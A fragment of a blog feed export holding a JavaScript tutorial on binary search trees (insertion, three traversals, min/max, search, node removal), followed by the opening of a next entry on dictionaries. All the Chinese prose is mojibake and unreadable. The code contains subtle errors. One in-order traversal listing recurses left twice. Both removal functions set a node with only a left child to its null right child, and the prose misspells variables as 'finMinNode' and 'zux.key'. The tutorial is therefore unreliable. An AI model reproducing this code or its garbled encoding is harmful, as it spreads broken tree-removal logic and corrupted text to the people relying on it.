æ–¹æ³•æŽ¥å—ä¸€ä¸ªå›žè°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚å›žè°ƒå‡½æ•°ç”¨æ¥å®šä¹‰æˆ‘ä»¬å¯¹éåŽ†åˆ°çš„æ¯ä¸ªèŠ‚ç‚¹è¿›è¡Œçš„æ“ä½œï¼ˆè¿™ä¹Ÿå«åšè®¿é—®è€…æ¨¡å¼ï¼‰ã€‚ç”±äºŽæˆ‘ä»¬åœ¨BST ä¸­æœ€å¸¸è§å®žçŽ°çš„ç®—æ³•æ˜¯é€’å½’ï¼Œè¿™é‡Œä½¿ç”¨ä¸€ä¸ªç§æœ‰çš„è¾…åŠ©å‡½æ•°ï¼Œæ¥æŽ¥å—ä¸€ä¸ªèŠ‚ç‚¹å’Œå¯¹åº”çš„å›žè°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚ 1234567var inOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; inOrderTraverseNode(node.left, callback); callback(node.key) inOrderTraverseNode(node.left, callback); &#125;&#125; è¦é€šè¿‡ä¸­åºéåŽ†çš„æ–¹æ³•éåŽ†ä¸€æ£µæ ‘ï¼Œé¦–å…ˆè¦æ£€æŸ¥ä»¥å‚æ•°å½¢å¼ä¼ å…¥çš„èŠ‚ç‚¹æ˜¯å¦ä¸º null ï¼ˆè¿™å°±æ˜¯åœæ­¢é€’å½’ç»§ç»­æ‰§è¡Œçš„åˆ¤æ–­æ¡ä»¶ï¼‰ ç„¶åŽé€’å½’è°ƒç”¨ç›¸åŒçš„å‡½æ•°æ¥è®¿é—®å·¦ä¾§å­èŠ‚ç‚¹ï¼Œæˆ–è€…å¯¹è¿™ä¸ªèŠ‚ç‚¹è¿›è¡Œä¸€äº›æ“ä½œï¼ˆcallbackï¼‰,ç„¶åŽå†è®¿é—®å³ä¾§å­èŠ‚ç‚¹ã€‚ æµ‹è¯•ã€‚ 123456789101112131415161718const tree = new BinarySearchTree();tree.insert(11);tree.insert(7);tree.insert(15);tree.insert(5);tree.insert(3);tree.insert(9);tree.insert(8);tree.insert(10);tree.insert(13);tree.insert(12);tree.insert(14);tree.insert(20);tree.insert(18);tree.insert(25);tree.insert(6);tree.inOrderTraverse(printNode);// 3 5 6 7 8 9 10 11 12 13 14 15 18 20 25 ä¸‹é¢çš„å›¾æè¿°äº† inOrderTraverse æ–¹æ³•çš„è®¿é—®è·¯å¾„ å…ˆåºéåŽ†å…ˆåºéåŽ†æ˜¯ä»¥ä¼˜äºŽåŽä»£èŠ‚ç‚¹çš„é¡ºåºè®¿é—®æ¯ä¸ªèŠ‚ç‚¹çš„ã€‚å…ˆåºéåŽ†çš„ä¸€ç§åº”ç”¨å°±æ˜¯æ‰“å°ä¸€ä¸ªç»“æž„åŒ–çš„æ–‡æ¡£ã€‚ å®žçŽ°ï¼š 123this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; preOrderTraverseNode æ–¹æ³•çš„å®žçŽ° 1234567var preOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; callback(node.key) preOrderTraverseNode(node.left, callback); preOrderTraverseNode(node.right, callback); &#125;&#125; å…ˆåºéåŽ†å’Œä¸­åºéåŽ†çš„ä¸åŒç‚¹æ˜¯ï¼Œå…ˆåºéåŽ†ä¼šå…ˆè®¿é—®èŠ‚ç‚¹çš„æœ¬èº«ï¼Œç„¶åŽå†è®¿é—®å®ƒçš„å·¦ä¾§å­èŠ‚ç‚¹ï¼Œæœ€åŽæ˜¯å³ä¾§å­èŠ‚ç‚¹ï¼Œè€Œä¸­åºéåŽ†çš„æ‰§è¡Œé¡ºåºæ˜¯ï¼šå…ˆè®¿é—®å·¦ä¾§å­èŠ‚ç‚¹ã€æŽ¥ç€èŠ‚ç‚¹æœ¬èº«ï¼Œæœ€åŽæ˜¯å³ä¾§å­èŠ‚ç‚¹ã€‚ ä¸‹é¢æ˜¯æµ‹è¯•ç»“æžœ 12tree.preOrderTraverse(printNode);// 11 7 5 3 6 9 8 10 15 13 12 14 20 18 25 ä¸‹é¢çš„æè¿°äº† preOrderTraverse æ–¹æ³•çš„è®¿é—®è·¯å¾„ åŽåºéåŽ†åŽåºéåŽ†æ˜¯å…ˆè®¿é—®èŠ‚ç‚¹çš„åŽä»£èŠ‚ç‚¹ï¼Œå†è®¿é—®èŠ‚ç‚¹æœ¬èº«ã€‚åŽåºéåŽ†çš„ä¸€ç§åº”ç”¨æ˜¯è®¡ç®—ä¸€ä¸ªç›®å½•å’Œå®ƒçš„å­ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶æ‰€å ç©ºé—´çš„å¤§å°ã€‚ å®žçŽ°ï¼š 123this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback);&#125; postOrderTraverseNode æ–¹æ³•çš„å®žçŽ°ï¼š 1234567var postOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; postOrderTraverseNode(node.left, callback); postOrderTraverseNode(node.right, callback); callback(node.key) &#125;&#125; è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåŽåºéåŽ†ä¼šå…ˆè®¿é—®å·¦ä¾§å­èŠ‚ç‚¹ï¼Œç„¶åŽæ˜¯å³ä¾§å­èŠ‚ç‚¹ï¼Œæœ€åŽæ˜¯çˆ¶èŠ‚ç‚¹ã€‚ ä¸‹é¢æ˜¯æµ‹è¯•ç»“æžœ 12tree.postOrderTraverse(printNode);// 3 6 5 8 10 9 7 12 14 13 18 25 20 15 11 ä¸‹å›¾æè¿°äº† postOrderTraverse æ–¹æ³•çš„è®¿é—®è·¯å¾„ æœç´¢æ ‘ä¸­çš„å€¼åœ¨æ ‘ä¸­ï¼Œæœ‰ä¸‰ç§ç»å¸¸æ‰§è¡Œçš„æœç´¢ç±»åž‹ æœç´¢æœ€å¤§å€¼ æœç´¢æœ€å°å€¼ æœç´¢ç‰¹å®šçš„å€¼ æœç´¢æœ€å°å€¼å’Œæœ€å¤§å€¼æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„æ ‘ä½œä¸ºå®žä¾‹ å¯ä»¥ä¸€çœ¼å‘çŽ°æ ‘æœ€åŽä¸€å±‚æœ€å·¦ä¾§çš„èŠ‚ç‚¹çš„å€¼ä¸º3ï¼Œè¿™æ˜¯è¿™æ£µæ ‘æœ€å°çš„é”®ï¼Œå¦‚æžœä½ å†çœ‹ä¸€çœ¼æœ€å³ç«¯çš„æ ‘çš„èŠ‚ç‚¹ï¼Œä¼šå‘çŽ°æ˜¯25ï¼Œè¿™æ˜¯è¿™æ£µæ ‘ä¸­æœ€å¤§çš„é”®ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ ‘çš„æœ€å°é”®çš„æ–¹æ³• 123this.min = function()&#123; return minNode(root);&#125; min æ–¹æ³•å°†ä¼šæš´éœ²ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªæ–¹æ³•è°ƒç”¨äº† minNodeæ–¹æ³•ã€‚ 123456789var minNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left &#125; return node.key &#125; return null;&#125; minNode æ–¹æ³•å…è®¸æˆ‘ä»¬ä»Žæ ‘ä¸­ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹å¯»æ‰¾æœ€å°çš„é”®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥çŸ¥é“ä¸€é¢—æ ‘æˆ–è€…å®ƒçš„å­æ ‘ä¸­æœ€å°çš„é”®ã€‚å› ä¸ºï¼Œæˆ‘ä»¬è°ƒç”¨ minNode æ–¹æ³•çš„æ—¶å€™ä¼ å…¥æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³æ‰¾åˆ°è¿™æ£µæ ‘çš„æœ€å°é”®ã€‚ åœ¨ minNode å†…éƒ¨ï¼Œæˆ‘ä»¬ä¼šéåŽ†æ ‘çš„å·¦è¾¹ï¼Œç›´åˆ°æ‰¾åˆ°æ ‘çš„æœ€ä¸‹å±‚ï¼ˆæœ€å·¦ç«¯ï¼‰ ç›¸ä¼¼çš„æ–¹å¼ï¼Œå¯ä»¥å®žçŽ° max æ–¹æ³• 123456789101112this.max = function()&#123; return maxNode(root); &#125;var maxNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.right !== null)&#123; node = node.right &#125; return node.key &#125; return null;&#125; æµ‹è¯• 12console.log('è¿™æ£µæ ‘çš„æœ€å¤§å€¼ï¼š'+tree.max()); // 25console.log('è¿™æ£µæ ‘çš„æœ€å°å€¼ï¼š'+tree.min()); // 3 æœç´¢ä¸€ä¸ªç‰¹å®šçš„å€¼å®žçŽ° 12345678910111213141516this.search = function(key)&#123; return searchNode(root,key)&#125;var searchNode = function(node,key)&#123; if(node === null)&#123; return false; &#125; if(key &lt; node.key)&#123; return searchNode(node.left, key) &#125;else if(key &gt; node.key)&#123; return searchNode(node.right, key) &#125;else&#123; return true &#125;&#125; æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å£°æ˜Ž search æ–¹æ³•ã€‚å’Œ BST ä¸­å£°æ˜Žçš„å…¶ä»–æ–¹æ³•çš„æ¨¡å¼ç›¸åŒï¼Œæˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ªè¾…åŠ©å‡½æ•°ã€‚ searchNode æ–¹æ³•å¯ä»¥ç”¨æ¥å¯»æ‰¾ä¸€æ£µæ ‘æˆ–è€…å®ƒçš„ä»»æ„å­æ ‘ä¸­çš„ä¸€ä¸ªç‰¹å®šçš„å€¼ã€‚ åœ¨å¼€å§‹ç®—æ³•å‰ï¼Œå…ˆéªŒè¯ä½œä¸ºä¼ å…¥å‚æ•°çš„node æ˜¯å¦ä¸º null.æ˜¯åˆ™è¯æ˜Žè¦æ‰¾çš„é”®æ²¡æœ‰æ‰¾åˆ°ï¼Œè¿”å›ž false. å¦‚æžœä¼ å…¥çš„ä¸æ˜¯ null,éœ€è¦ç»§ç»­éªŒè¯ï¼Œå¦‚æžœè¦æ‰¾çš„é”®æ¯”å½“å‰çš„èŠ‚ç‚¹å°ï¼Œé‚£ä¹ˆç»§ç»­åœ¨å·¦ä¾§çš„å­æ ‘ä¸Šæœç´¢ï¼Œåä¹‹åœ¨å³ä¾§å­èŠ‚ç‚¹å¼€å§‹ç»§ç»­æœç´¢ï¼Œå¦åˆ™å°±è¯´æ˜Žè¦æ‰¾çš„é”®å’Œå½“å‰èŠ‚ç‚¹çš„é”®ç›¸ç­‰ï¼Œå°±è¿”å›ž trueæ¥è¡¨ç¤ºæ‰¾åˆ°äº†è¿™ä¸ªé”®ã€‚ æµ‹è¯• 12console.log(tree.search(3)); // trueconsole.log(tree.search(28)); // false ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ç§»é™¤æ–¹æ³•æ˜¯æœ€å¤æ‚çš„ï¼Œå®žçŽ° 123this.remove = function(key)&#123; root = removeNode(root,key);&#125; è¿™ä¸ªæ–¹æ³•æŽ¥å—è¦ç§»é™¤å¹¶ä¸”å®ƒè°ƒç”¨äº† removeNode æ–¹æ³•ï¼Œä¼ å…¥ root å’Œè¦ç§»é™¤çš„é”®ä½œä¸ºå‚æ•°ã€‚ removeNode å¤åˆ¶åœ¨äºŽæˆ‘ä»¬å¤„ç†ä¸åŒçš„è¿è¡Œåœºæ™¯ï¼Œè¿˜æ˜¯é€šè¿‡é€’å½’æ¥å®žçŽ°ã€‚ 12345678910111213141516171819202122232425262728293031var removeNode = function(node,key)&#123; if(node === null)&#123; return null; &#125; if(key &lt; node.key)&#123; node.left = removeNode(node.left,key) return node; &#125;else if(key &gt; node.key)&#123; node.right = removeNode(node.right,key) return node; &#125;else&#123; // ä¸€ä¸ªå¶èŠ‚ç‚¹ if(node.left === null &amp;&amp; node.right === null)&#123; node = null; return node; &#125; // åªæœ‰ä¸€ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ if(node.left === null)&#123; node = node.right return node; &#125;else if(node.right === null)&#123; node = node.right; return node; &#125; // ä¸€ä¸ªæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ var aux = findMinNode(node.right); node.key = aux.key; node.right = removeNode(node.right,aux.key); return node; &#125;&#125; ç§»é™¤ä¸€ä¸ªå¶èŠ‚ç‚¹ ç¬¬ä¸€ç§æƒ…å†µæ˜¯è¯¥èŠ‚ç‚¹æ˜¯ä¸€ä¸ªæ²¡æœ‰å·¦ä¾§æˆ–è€…å³ä¾§å­èŠ‚ç‚¹çš„å¶èŠ‚ç‚¹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ç»™è¿™ä¸ªèŠ‚ç‚¹èµ‹äºˆ null æ¥ç§»é™¤å®ƒã€‚ä½†æ˜¯å­¦ä¹ äº†é“¾è¡¨çš„å®žçŽ°åŽï¼Œæˆ‘ä»¬çŸ¥é“ä»…ä»…èµ‹äºˆä¸€ä¸ª null å€¼æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜éœ€è¦å¤„ç†æŒ‡é’ˆã€‚åœ¨è¿™é‡Œï¼Œè¿™ä¸ªèŠ‚ç‚¹æ²¡æœ‰ä»»ä½•çš„å­èŠ‚ç‚¹ï¼Œä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼Œéœ€è¦é€šè¿‡è¿”å›ž null æ¥å°†å¯¹åº”çš„çˆ¶èŠ‚ç‚¹æŒ‡é’ˆèµ‹å€¼ null ï¼ˆreturn nodeï¼‰ã€‚ çŽ°åœ¨èŠ‚ç‚¹çš„å€¼å·²ç»æ˜¯ null ï¼Œçˆ¶èŠ‚ç‚¹æŒ‡å‘å®ƒçš„æŒ‡é’ˆä¹Ÿä¼šæŽ¥æ”¶è¿™ä¸ªå€¼ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å‡½æ•°ä¸­è¿”å›žèŠ‚ç‚¹çš„å€¼çš„åŽŸå› ã€‚çˆ¶èŠ‚ç‚¹æ€»æ˜¯ä¼šæŽ¥å—åˆ°å‡½æ•°çš„è¿”å›žå€¼ã€å¦å¤–ä¸€ä¸ªå¯è¡Œçš„æ–¹æ³•å°±æ˜¯å°†çˆ¶èŠ‚ç‚¹å’ŒèŠ‚ç‚¹æœ¬èº«éƒ½ä½œä¸ºå‚æ•°ä¼ å…¥æ–¹æ³•å†…éƒ¨ã€‚ ç§»é™¤æœ‰ä¸€ä¸ªå·¦ä¾§æˆ–å³ä¾§å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ ç§»é™¤æœ‰ä¸€ä¸ªå·¦ä¾§å­èŠ‚ç‚¹æˆ–å³ä¾§å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦è·³è¿‡è¿™ä¸ªèŠ‚ç‚¹ï¼Œç›´æŽ¥å°†çˆ¶èŠ‚ç‚¹æŒ‡å‘å®ƒçš„æŒ‡é’ˆæŒ‡å‘å­èŠ‚ç‚¹ã€‚ å¦‚æžœè¿™ä¸ªèŠ‚ç‚¹æ²¡æœ‰å·¦ä¾§å­èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæœ‰ä¸€ä¸ªå³ä¾§å­èŠ‚ç‚¹ã€‚å› ä¸ºæˆ‘ä»¬æŠŠå¯¹å®ƒçš„å¼•ç”¨æ”¹ä¸ºå¯¹å®ƒå³ä¾§å­èŠ‚ç‚¹çš„å¼•ç”¨ï¼Œå¹¶è¿”å›žæ›´æ–°åŽçš„èŠ‚ç‚¹ã€‚å¦‚æžœè¿™ä¸ªèŠ‚ç‚¹æ²¡æœ‰å³ä¾§å­èŠ‚ç‚¹ï¼Œä¹Ÿæ˜¯ä¸€æ ·â€”â€”æŠŠå¯¹å®ƒçš„å¼•ç”¨æ”¹ä¸ºå¯¹å®ƒå·¦ä¾§å­èŠ‚ç‚¹çš„å¼•ç”¨å¹¶è¿”å›žæ›´æ–°åŽçš„å€¼ã€‚ ç§»é™¤æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ æœ€å¤æ‚çš„æƒ…å†µå°±æ˜¯è¦ç§»é™¤çš„èŠ‚ç‚¹æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹â€”â€”å·¦ä¾§å­èŠ‚ç‚¹å’Œå³ä¾§å­èŠ‚ç‚¹ã€‚è¦ç§»é™¤æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ï¼Œéœ€è¦æ‰§è¡Œå››ä¸ªæ­¥éª¤ å½“æ‰¾åˆ°äº†éœ€è¦ç§»é™¤çš„èŠ‚ç‚¹åŽï¼Œéœ€è¦æ‰¾åˆ°å®ƒå³è¾¹å­æ ‘ä¸­æœ€å°çš„èŠ‚ç‚¹ï¼ˆå®ƒçš„ç»§æ‰¿è€… var aux = finMinNode(node.right)ï¼‰ ç„¶åŽï¼Œç”¨å®ƒå³ä¾§å­æ ‘ä¸­æœ€å°èŠ‚ç‚¹çš„é”®åŽ»æ›´æ–°è¿™ä¸ªèŠ‚ç‚¹çš„å€¼ï¼ˆnode.key = zux.keyï¼‰ã€‚é€šè¿‡è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬æ”¹å˜äº†è¿™ä¸ªèŠ‚ç‚¹çš„é”®ï¼Œä¹Ÿå°±æ˜¯å®ƒè¢«ç§»é™¤äº†ã€‚ ä½†æ˜¯ï¼Œè¿™æ ·åœ¨æ ‘ä¸­å°±æœ‰ä¸¤ä¸ªæ‹¥æœ‰ç›¸åŒé”®çš„èŠ‚ç‚¹äº†ï¼Œéœ€è¦ç»§ç»­æŠŠå³ä¾§å­æ ‘ä¸­çš„æœ€å°èŠ‚ç‚¹ç§»é™¤ï¼Œæ¯•ç«Ÿå®ƒå·²ç»è¢«ç§»è‡³è¦ç§»é™¤çš„èŠ‚ç‚¹çš„ä½ç½®äº†ã€‚ æœ€åŽï¼Œå‘å®ƒçš„çˆ¶èŠ‚ç‚¹è¿”å›žæ›´æ–°åŽèŠ‚ç‚¹çš„å¼•ç”¨ã€‚ findMinNode æ–¹æ³•çš„å®žçŽ°å’Œ min æ–¹æ³•çš„å®žçŽ°æ–¹å¼æ˜¯ä¸€æ ·çš„ã€‚å”¯ä¸€ä¸åŒä¹‹å¤„åœ¨äºŽï¼Œåœ¨ min æ–¹æ³•ä¸­åªè¿”å›žé”®ï¼Œè€Œåœ¨ findMinNode ä¸­è¿”å›žäº†èŠ‚ç‚¹ã€‚ å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163var insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode; &#125;else&#123; insertNode(node.left,newNode) &#125; &#125;else&#123; if(node.right === null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode) &#125; &#125;&#125;var inOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; inOrderTraverseNode(node.left, callback); callback(node.key) inOrderTraverseNode(node.right, callback); &#125;&#125; var preOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; callback(node.key) preOrderTraverseNode(node.left, callback); preOrderTraverseNode(node.right, callback); &#125;&#125; var postOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; postOrderTraverseNode(node.left, callback); postOrderTraverseNode(node.right, callback); callback(node.key) &#125;&#125;var minNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left &#125; return node.key &#125; return null;&#125; var maxNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.right !== null)&#123; node = node.right &#125; return node.key &#125; return null;&#125;var searchNode = function(node,key)&#123; if(node === null)&#123; return false; &#125; if(key &lt; node.key)&#123; return searchNode(node.left, key) &#125;else if(key &gt; node.key)&#123; return searchNode(node.right, key) &#125;else&#123; return true &#125;&#125;var removeNode = function(node,key)&#123; if(node === null)&#123; return null; &#125; if(key &lt; node.key)&#123; node.left = removeNode(node.left,key) return node; &#125;else if(key &gt; node.key)&#123; node.right = removeNode(node.right,key) return node; &#125;else&#123; // ä¸€ä¸ªå¶èŠ‚ç‚¹ if(node.left === null &amp;&amp; node.right === null)&#123; node = null; return node; &#125; // åªæœ‰ä¸€ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ if(node.left === null)&#123; node = node.right return node; &#125;else if(node.right === null)&#123; node = node.right; return node; &#125; // ä¸€ä¸ªæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ var aux = findMinNode(node.right); node.key = aux.key; node.right = removeNode(node.right,aux.key); return node; &#125;&#125;var findMinNode = function(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left; &#125; return node;&#125;var heightNode = function(node)&#123; if(node === null)&#123; return -1; &#125;else&#123; return Math.max(heightNode(node.left),heightNode(node.right))+ 1; &#125;&#125;var printNode = function(value)&#123; console.log(value);&#125;function BinarySearchTree()&#123; var Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; var root = null; this.insert = function(key)&#123; var newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode) &#125; &#125; this.search = function(key)&#123; return searchNode(root,key) &#125; this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback); &#125; this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback); &#125; this.min = function()&#123; return minNode(root); &#125; this.max = function()&#123; return maxNode(root); &#125; this.remove = function(key)&#123; root = removeNode(root,key); console.log(root); &#125; this.deep = function()&#123; return heightNode(root); &#125;&#125; è‡ªå¹³è¡¡æ ‘BST å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå–å†³äºŽä½ æ·»åŠ çš„èŠ‚ç‚¹æ•°ï¼Œæ ‘çš„ä¸€æ¡è¾¹å¯èƒ½ä¼šéžå¸¸æ·±ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ ‘çš„ä¸€æ¡åˆ†æ”¯ä¼šæœ‰å¾ˆå¤šå±‚ï¼Œè€Œå…¶ä»–çš„åˆ†æ”¯å´åªæœ‰å‡ å±‚ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ‰ä¸€ç§æ ‘å«åš Sdelson-Velskii-Land æ ‘ï¼ˆAVL æ ‘ï¼‰ã€‚ä¸€ç§è‡ªå¹³è¡¡çš„äºŒå‰æœç´¢æ ‘ï¼Œæ„æ€æ˜¯ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹å·¦å³ä¸¤ä¾§å­æ ‘çš„é«˜åº¦ä¹‹å·®æœ€å¤šä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§æ ‘ä¼šåœ¨æ·»åŠ å’Œç§»é™¤èŠ‚ç‚¹æ—¶å°½é‡è¯•ç€æˆä¸ºä¸€é¢—å®Œå…¨çš„æ ‘ã€‚ è¿™é‡Œä¸åšå…·ä½“æ·±å…¥å®žçŽ°ï¼Œå°½ç®¡AVLæ ‘æ˜¯è‡ªå¹³è¡¡çš„ï¼Œå…¶æ’å…¥å’Œç§»é™¤èŠ‚ç‚¹çš„æ€§èƒ½å¹¶ä¸æ€»æ˜¯æœ€å¥½çš„ã€‚æ›´å¥½çš„é€‰æ‹©æ˜¯çº¢é»‘æ ‘ã€‚çº¢é»‘æ ‘å¯ä»¥é«˜æ•ˆæœ‰åºçš„éåŽ†å…¶èŠ‚ç‚¹ã€‚æœ‰å…´è¶£çš„è¯·è‡ªè¡Œç™¾åº¦ å°ç»“è¿™ç« ä»‹ç»äº†å¹¿æ³›ä½¿ç”¨çš„åŸºæœ¬æ ‘æ•°æ®ç»“æž„â€”â€”äºŒå‰æœç´¢æ ‘ä¸­æ·»åŠ ã€ç§»é™¤å’Œæœç´¢é¡¹çš„ç®—æ³•ã€‚åŒæ ·ä»‹ç»äº†è®¿é—®æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‰ç§éåŽ†æ–¹å¼â€”â€”ä¸­åºã€å…ˆåºã€åŽåºéåŽ† ä¸‹ä¸€ç« ï¼Œå°†å­¦ä¹ å›¾çš„åŸºæœ¬æ¦‚å¿µï¼Œä¹Ÿæ˜¯ä¸€ç§éžçº¿æ€§çš„æ•°æ®ç»“æž„ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬ä¸ƒç« ï¼‰â€”â€” å­—å…¸å’Œæ•£åˆ—è¡¨]]></title>
    <url>%2F2018-11-02-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part7.html</url>
    <content type="text"><![CDATA[æœ¬ç« å­¦ä¹ ä½¿ç”¨å­—å…¸å’Œæ•£åˆ—è¡¨æ¥å­˜å‚¨å”¯ä¸€å€¼ï¼ˆä¸é‡å¤çš„å€¼ï¼‰çš„æ•°æ®ç»“æž„ã€‚é›†åˆã€å­—å…¸å’Œæ•£åˆ—è¡¨å¯ä»¥å­˜å‚¨ä¸é‡å¤çš„å€¼ã€‚åœ¨é›†åˆä¸­ï¼Œæˆ‘ä»¬æ„Ÿå…´è¶£çš„æ˜¯æ¯ä¸ªå€¼æœ¬èº«ï¼Œå¹¶æŠŠå®ƒä½œä¸ºä¸»è¦å…ƒç´ ã€‚è€Œå­—å…¸å’Œæ•£åˆ—è¡¨ä¸­éƒ½æ˜¯ç”¨ [é”®ï¼Œå€¼]çš„å½¢å¼æ¥å­˜å‚¨æ•°æ®ã€‚ä½†æ˜¯ä¸¤ä¸ªæ•°æ®ç»“æž„çš„å®žçŽ°æ–¹å¼ç•¥æœ‰ä¸åŒã€‚ ç¬¬ä¸ƒç«  å­—å…¸å’Œæ•£åˆ—è¡¨å­—å…¸é›†åˆè¡¨ç¤ºä¸€ç»„äº’ä¸ç›¸åŒçš„å…ƒç´ ï¼ˆä¸é‡å¤çš„å…ƒç´ ï¼‰ã€‚åœ¨å­—å…¸é‡Œï¼Œå­˜å‚¨çš„æ˜¯ [é”®ï¼Œå€¼] å¯¹ï¼Œå…¶ä¸­é”®åæ˜¯ç”¨æ¥æŸ¥è¯¢ç‰¹å®šå…ƒç´ çš„ã€‚å­—å…¸å’Œç»“åˆå¾ˆç›¸ä¼¼ï¼Œé›†åˆä»¥ [å€¼ï¼Œå€¼] çš„å½¢å¼å­˜å‚¨å…ƒç´ ï¼Œå­—å…¸åˆ™æ˜¯ä»¥ [é”®ï¼Œå€¼]çš„å½¢å¼æ¥å­˜å‚¨å…ƒç´ ã€‚å­—å…¸ä¹Ÿæˆä¸ºæ˜ å°„ã€‚ åˆ›å»ºå­—å…¸ä¸Ž Set ç±»ç›¸ä¼¼ï¼ŒES6 ä¸­ä¹ŸåŒ…å«äº†ä¸€ä¸ª Map ç±»çš„å®žçŽ°ï¼Œå³æˆ‘ä»¬æ‰€è¯´çš„å­—å…¸ã€‚ æˆ‘ä»¬åœ¨æœ¬ç« ä¸­ï¼Œå°†è¦å®žçŽ°çš„æ˜¯ä»¥ES6 ä¸­ Map ç±»çš„å®žçŽ°ä¸ºåŸºç¡€çš„ã€‚ä½ ä¼šå‘çŽ°å®ƒè·Ÿ Set ç±»å¾ˆç›¸ä¼¼ï¼ˆä½†ä¸åŒä¸Žå­˜å‚¨ [å€¼ï¼Œå€¼]å¯¹çš„å½¢å¼ï¼Œæˆ‘ä»¬å°†è¦å­˜å‚¨çš„æ˜¯ [é”®ï¼Œå€¼]å¯¹ã€‚ï¼‰ ä¸‹é¢æ˜¯æˆ‘ä»¬çš„ Dictionary ç±»çš„éª¨æž¶ï¼š 123function Dictionary()&#123; let items = &#123;&#125;;&#125; ç„¶åŽæˆ‘ä»¬è¦å£°æ˜Žä¸€äº› æ˜ å°„/ å­—å…¸ æ‰€èƒ½ä½¿ç”¨çš„æ–¹æ³•ã€‚ setï¼ˆkey,valueï¼‰ï¼šæƒ³å­—å…¸ä¸­æ·»åŠ æ–°çš„å…ƒç´ ã€‚ deleteï¼ˆkeyï¼‰ï¼šé€šè¿‡ä½¿ç”¨é”®å€¼æ¥ä»Žå­—å…¸ä¸­ç§»é™¤é”®å€¼å¯¹åº”çš„æ•°æ®å€¼ hasï¼ˆkeyï¼‰ï¼šå¦‚æžœæŸä¸ªé”®å€¼å­˜åœ¨äºŽè¿™ä¸ªå­—å…¸ï¼Œåˆ™è¿”å›žtrue,æ²¡æœ‰åˆ™è¿”å›ž false getï¼ˆkeyï¼‰ï¼šé€šè¿‡é”®å€¼æŸ¥æ‰¾ç‰¹å®šçš„æ•°å€¼å¹¶è¿”å›ž 